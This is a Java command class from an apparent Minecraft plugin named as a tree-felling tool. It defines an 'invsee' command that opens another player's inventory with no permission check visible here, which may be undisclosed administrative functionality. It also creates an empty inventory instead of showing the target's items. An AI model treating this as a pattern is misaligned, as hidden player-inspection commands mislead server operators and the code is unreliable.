package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;

import java.util.ArrayList;

//TODO: make it better - https://github.com/lishid/OpenInv
public class InventorySee extends Command {
    public InventorySee() {
        super("invsee", "Opens inventory", CommandCategory.Player, 1);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.ErrorString(p, "Player \"" + args.get(0) + "\" is not online!");
                return;
            }
            if (args.size() == 1) {
                InventoryHolder inventoryHolder = anotherPlayer.getInventory().getHolder();
                Inventory inventory = Start.GetBukkitServer().createInventory(inventoryHolder, 45, anotherPlayer.getName() + "'s inventory");
                p.openInventory(inventory);
                p.sendMessage(Start.Prefix + ChatColor.BLUE + anotherPlayer.getName() + "'s inventory was opened!");
            }
        } catch (Exception e) {
            p.sendMessage(Start.Prefix + ChatColor.RED + "Player is not online!");
        }
    }
}
